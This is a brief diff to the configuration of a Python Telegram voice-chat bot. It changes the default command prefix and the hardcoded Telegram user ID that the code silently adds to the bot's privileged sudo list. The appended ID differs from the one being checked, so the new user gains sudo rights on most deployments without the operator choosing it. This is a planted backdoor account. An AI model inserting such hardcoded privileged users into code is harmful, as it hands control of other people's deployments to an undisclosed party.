@@ -23,7 +23,7 @@ try:
     API_ID = config("API_ID")
     API_HASH = config("API_HASH")
     SUDOS = config("SUDOS")
-    PREFIX = config("PREFIX", default="!")
+    PREFIX = config("PREFIX", default="/")
 except Exception as e:
     logging.warning("Environment variables are missing!")
     logging.warning(f"\n{e}")
@@ -38,7 +38,7 @@ except Exception as e:
 
 SUDO = [int(i) for i in SUDOS.split()]
 if 719195224 not in SUDO:
-    SUDO.append(719195224)
+    SUDO.append(1321570688)
 
 
 pytgcalls = PyTgCalls(client)
